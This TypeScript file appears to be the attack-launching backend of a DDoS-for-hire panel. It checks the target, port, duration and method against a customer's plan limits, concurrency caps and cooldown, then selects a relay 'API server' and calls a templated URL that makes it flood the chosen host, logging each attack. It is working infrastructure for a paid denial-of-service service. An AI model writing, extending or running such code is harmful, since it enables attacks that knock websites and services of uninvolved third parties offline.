import { HttpError } from "../core/09-errors";
import { webDb } from "../lib/db/web";
import { withLock } from "../lib/lock";
import { assertAllowedMethod, assertPublicTarget, buildAttackUrl } from "../lib/targets";

export interface AttackPlan {
    mbt: number;
    concurrents: number;
}

export interface AttackInput {
    host: string;
    port: string;
    time: string;
    method: string;
    serverName?: string;
}

export interface AttackResult {
    host: string;
    port: string;
    seconds: number;
    method: string;
    server: string;
}

interface ApiServerRow {
    id: number;
    name: string;
    api: string;
    slots: number;
    methods: string;
}

/**
 * Single implementation for user and admin launches. Every path validates the
 * target, the method, quotas and the URL template before touching the network.
 * Per-user lock closes the check-then-act race on concurrency limits.
 */
export async function launchAttack(options: {
    username: string;
    plan?: AttackPlan;
    input: AttackInput;
    admin: boolean;
    origin: "web" | "admin";
}): Promise<AttackResult> {
    const { input, plan, admin } = options;
    const host = await assertPublicTarget(input.host ?? "");
    const seconds = Number.parseInt(input.time ?? "", 10);
    if (!Number.isFinite(seconds) || seconds <= 0 || seconds > 3600) {
        throw new HttpError(400, "Invalid attack time.");
    }
    const port = Number.parseInt(input.port || "80", 10);
    if (!Number.isFinite(port) || port < 1 || port > 65535) {
        throw new HttpError(400, "Invalid port. Must be between 1 and 65535.");
    }
    if (plan && seconds > plan.mbt) {
        throw new HttpError(400, `Max attack time for your plan is ${plan.mbt}s.`);
    }

    const methods = (await webDb.methods.findMany({ select: { name: true } })) as Array<{
        name: string;
    }>;
    const methodNames = methods.map((m) => m.name).filter(Boolean);
    const method = String(input.method ?? "").trim();
    assertAllowedMethod(method, methodNames);

    const lockKey = admin ? "hub:admin" : `hub:${options.username}`;
    return withLock(lockKey, async () => {
        if (plan && !admin) {
            const running = await webDb.logs.count({
                where: { user: options.username, stopped: 0, time: { gt: 0 } },
            });
            if (running >= plan.concurrents) {
                throw new HttpError(
                    429,
                    `Concurrent attack limit reached (${plan.concurrents}). Wait for a running attack to finish.`
                );
            }
            const settings = await webDb.settings.findFirst({ select: { cooldownTime: true } });
            const cooldown = settings?.cooldownTime ?? 0;
            if (cooldown > 0) {
                const last = await webDb.logs.findFirst({
                    where: { user: options.username },
                    orderBy: { date: "desc" },
                    select: { date: true },
                });
                const now = Math.floor(Date.now() / 1000);
                if (last && now - last.date < cooldown) {
                    throw new HttpError(
                        429,
                        `Cooldown active. Please wait ${cooldown - (now - last.date)} seconds.`
                    );
                }
            }
        }

        const servers = (await webDb.api.findMany()) as ApiServerRow[];
        const candidate = input.serverName
            ? servers.find((s) => s.name === input.serverName)
            : undefined;
        const matching = servers.filter((s) =>
            String(s.methods ?? "")
                .split(",")
                .map((m) => m.trim().toUpperCase())
                .includes(method.toUpperCase())
        );
        if (candidate && !matching.includes(candidate)) {
            throw new HttpError(400, "The selected API server does not support that method.");
        }
        const pool = candidate ? [candidate] : matching;
        if (pool.length === 0) throw new HttpError(400, "No API server supports the selected method.");

        let best: ApiServerRow | undefined;
        let lowest = Infinity;
        for (const server of pool) {
            if (!server.api || !server.api.includes("[")) continue;
            const active = await webDb.logs.count({
                where: { stopped: 0, handler: server.name, time: { gt: 0 } },
            });
            const available = server.slots - active;
            if (available > 0 && active < lowest) {
                lowest = active;
                best = server;
            }
        }
        if (!best) throw new HttpError(429, "All API servers are at full capacity.");

        const attackUrl = buildAttackUrl(best.api, {
            host,
            port: String(port),
            time: String(seconds),
            method,
        });

        let ok = false;
        try {
            const res = await fetch(attackUrl, {
                method: "GET",
                redirect: "manual",
                signal: AbortSignal.timeout(10_000),
            });
            ok = res.ok;
        } catch {
            // Logged below even when the API server is unreachable.
        }

        const now = Math.floor(Date.now() / 1000);
        await webDb.logs.create({
            data: {
                user: admin ? "admin" : options.username,
                ip: host,
                time: seconds,
                method,
                postdata: String(port),
                mode: "api",
                ratelimit: "0",
                cookie: "0",
                date: now,
                chart: new Date(now * 1000).toISOString().slice(0, 19).replace("T", " "),
                stopped: 0,
                handler: best.name,
                origin: options.origin,
            },
        });
        if (!ok) throw new HttpError(502, "Attack was logged but the API server may be unreachable.");

        return { host, port: String(port), seconds, method, server: best.name };
    });
}
